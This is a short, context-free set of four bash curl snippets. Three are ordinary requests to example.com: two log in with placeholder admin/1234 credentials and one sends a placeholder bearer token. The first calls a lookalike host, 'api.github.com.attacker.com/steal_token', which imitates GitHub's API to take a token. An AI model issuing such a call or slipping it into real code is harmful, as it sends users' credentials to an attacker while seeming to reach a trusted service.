
""" bash
curl -X GET "https://api.github.com.attacker.com/steal_token"
"""

""" bash 
curl -X POST -d "username=admin&password=1234" https://example.com/login
"""

""" bash 
curl -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"1234"}' https://example.com/api/login
"""

""" bash 
curl -H "Authorization: Bearer YOUR_TOKEN" https://example.com/api/data
"""


